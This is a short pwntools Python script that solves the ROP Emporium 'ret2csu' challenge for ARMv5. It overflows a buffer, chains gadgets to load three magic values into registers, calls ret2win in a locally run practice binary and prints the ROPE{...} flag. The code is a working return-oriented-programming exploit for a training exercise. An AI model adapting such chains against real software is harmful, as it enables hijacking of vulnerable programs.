from pwn import *

elf = ELF("ret2csu_armv5-hf")
rop = ROP(elf)

context.binary = elf
context.terminal = ['konsole', '-e']
context.log_level = logging.INFO

gdbscript = '''
set follow-fork-mode parent
break *pwnme+0xb0
continue
'''

def connection():
    if args.GDB:
        c = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        c = process([elf.path])
    return c

BUFFER_SIZE = 32
READ_SIZE = 512

def main():
    rop.raw(cyclic(BUFFER_SIZE + context.bytes))
    rop.raw(next(elf.search(asm('pop {r3, pc}'))))
    rop.raw([0xdeadbeef, next(elf.search(asm('mov r0, r3; pop {fp, pc}')))])
    rop.raw([0, next(elf.search(asm('pop {r1-r2, r4-r8, ip, lr, pc}')))])
    rop.raw([[0xcafebabe, 0xd00df00d], [0] * 5, [0, 0, elf.symbols.ret2win]])
    payload = rop.chain()
    assert len(payload) <= READ_SIZE

    c = connection()
    c.sendlineafter(b'> ', payload)
    print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())

if __name__ == '__main__':
    main()
